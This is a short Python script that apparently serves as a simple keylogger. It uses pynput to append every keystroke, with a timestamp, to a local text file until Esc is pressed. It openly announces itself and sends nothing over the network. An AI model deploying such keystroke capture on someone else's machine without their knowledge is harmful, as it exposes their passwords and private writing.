from pynput import keyboard
import datetime


def remove_last_char():
    with open("./file.txt", "r") as output_file:
        data = output_file.read()
    with open("./file.txt", "w") as output_file:
        output_file.write(data[:-1])

def on_press(key):
        try:
            with open("./file.txt", "a") as output_file:
                if key == keyboard.Key.space:
                    output_file.write(" ")
                elif key == keyboard.Key.enter:
                    output_file.write("\n")
                else:
                    output_file.write(key.char)
        except AttributeError:
            if key == keyboard.Key.backspace:
                remove_last_char()
            elif key == keyboard.Key.esc:
                # Stop listener
                return False


# Record the date and time in the file
with open("./file.txt", "a") as file:
    current_datetime = datetime\
                        .datetime\
                        .now()\
                        .strftime("%d/%b/%Y, %I:%M %p")
    file.write(f"\n\n{current_datetime}\n")


# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    print("The keys are being printed in the 'file.txt' file!!")
    print("Press Esc to exit!!")
    listener.join()